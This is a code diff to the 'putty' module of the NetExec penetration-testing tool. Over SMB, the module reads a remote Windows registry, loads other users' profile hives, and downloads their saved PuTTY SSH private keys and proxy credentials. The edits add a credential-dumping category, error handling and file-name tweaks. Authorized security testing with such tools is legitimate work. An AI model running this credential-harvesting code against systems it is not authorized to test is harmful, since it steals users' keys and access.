@@ -7,6 +7,7 @@ from impacket.dcerpc.v5 import rrp
 from impacket.examples.secretsdump import RemoteOperations
 from os import makedirs
 from nxc.helpers.logger import highlight
+from nxc.helpers.misc import CATEGORY
 from nxc.paths import NXC_PATH
 import re
 
@@ -17,8 +18,7 @@ class NXCModule:
     name = "putty"
     description = "Query the registry for users who saved ssh private keys in PuTTY. Download the private keys if found."
     supported_protocols = ["smb"]
-    opsec_safe = True
-    multiple_hosts = True
+    category = CATEGORY.CREDENTIAL_DUMPING
 
     def __init__(self):
         self.context = None
@@ -69,19 +69,23 @@ class NXCModule:
     def load_missing_users(self, unloaded_user_objects):
         """Load missing users into registry to access their registry keys."""
         for user_object in unloaded_user_objects:
-            # Extract profile Path of NTUSER.DAT
-            reg_handle = rrp.hOpenLocalMachine(self.rrp._RemoteOperations__rrp)["phKey"]
-            key_handle = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, f"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\{user_object}")["phkResult"]
-            user_profile_path = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "ProfileImagePath")[1].split("\x00")[:-1][0]
-            rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)
+            try:
+                # Extract profile Path of NTUSER.DAT
+                reg_handle = rrp.hOpenLocalMachine(self.rrp._RemoteOperations__rrp)["phKey"]
+                key_handle = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, f"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\{user_object}")["phkResult"]
+                user_profile_path = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "ProfileImagePath")[1].split("\x00")[:-1][0]
+                rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)
 
-            # Load Profile
-            reg_handle = rrp.hOpenUsers(self.rrp._RemoteOperations__rrp)["phKey"]
-            key_handle = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, "")["phkResult"]
+                # Load Profile
+                reg_handle = rrp.hOpenUsers(self.rrp._RemoteOperations__rrp)["phKey"]
+                key_handle = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, "")["phkResult"]
 
-            self.context.log.debug(f"LOAD USER INTO REGISTRY: {user_object}")
-            rrp.hBaseRegLoadKey(self.rrp._RemoteOperations__rrp, key_handle, user_object, f"{user_profile_path}\\NTUSER.DAT")
-            rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)
+                self.context.log.debug(f"LOAD USER INTO REGISTRY: {user_object}")
+                rrp.hBaseRegLoadKey(self.rrp._RemoteOperations__rrp, key_handle, user_object, f"{user_profile_path}\\NTUSER.DAT")
+                rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)
+            except rrp.DCERPCSessionError as e:
+                self.context.log.fail(f"Error loading user {user_object} into registry: {e}")
+                self.context.log.debug(traceback.format_exc())
 
     def unload_missing_users(self, unloaded_user_objects):
         """If some user were not logged in at the beginning we unload them from registry."""
@@ -92,7 +96,7 @@ class NXCModule:
             self.context.log.debug(f"UNLOAD USER FROM REGISTRY: {user_object}")
             try:
                 rrp.hBaseRegUnLoadKey(self.rrp._RemoteOperations__rrp, key_handle, user_object)
-            except Exception as e:
+            except rrp.DCERPCSessionError as e:
                 self.context.log.fail(f"Error unloading user {user_object} in registry: {e}")
                 self.context.log.debug(traceback.format_exc())
         rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)
@@ -150,13 +154,13 @@ class NXCModule:
         return sessions
 
     def extract_session(self, sessions):
-        proxycreds_file = f"{NXC_PATH}/modules/PuTTY/putty_proxycreds_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}".replace(":", "-")
+        proxycreds_file = f"{NXC_PATH}/modules/PuTTY/putty_proxycreds_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}"
         for session in sessions:
             if session["private_key_path"]:
                 makedirs(f"{NXC_PATH}/modules/PuTTY", exist_ok=True)
                 share = session["private_key_path"].split(":")[0] + "$"
                 file_path = session["private_key_path"].split(":")[1]
-                download_path = f"{NXC_PATH}/modules/PuTTY/putty_{session['user']}_{session['session_name']}_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}.sec".replace(":", "-")
+                download_path = f"{NXC_PATH}/modules/PuTTY/putty_{session['user']}_{session['session_name']}_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}.sec"
 
                 buf = BytesIO()
                 with open(download_path, "wb") as file:
